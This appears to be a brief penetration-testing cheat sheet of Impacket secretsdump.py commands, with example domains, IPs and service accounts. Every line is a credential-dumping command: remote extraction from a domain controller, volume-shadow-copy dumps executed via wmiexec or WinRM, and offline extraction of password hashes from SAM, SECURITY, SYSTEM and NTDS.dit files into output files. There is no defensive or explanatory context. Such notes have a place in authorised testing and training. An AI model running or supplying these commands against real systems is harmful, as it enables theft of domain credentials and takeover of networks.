# Secretsdump
```
secretsdump.py -dc-ip 192.168.1.9 acme.xyz/Eran.Martina@192.168.1.9


secretsdump.py acme.corp/svc_veracrypt@10.10.12.5 -use-vss -exec-method wmiexec

secretsdump.py acme.corp/svc_datakeeper@10.10.12.5 -use-vss -exec-method Winrm



secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save acme.corp/svc_sqlt@192.168.1.1
secretsdump.py -system system -ntds ntds.dit LOCAL
secretsdump.py -system system -ntds ntds.dit LOCAL > hashes.txt
secretsdump.py -system system -ntds ntds.dit -hashes lmhash:lmhash LOCAL -outputfile ntlm-extract
secretsdump.py -system system -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```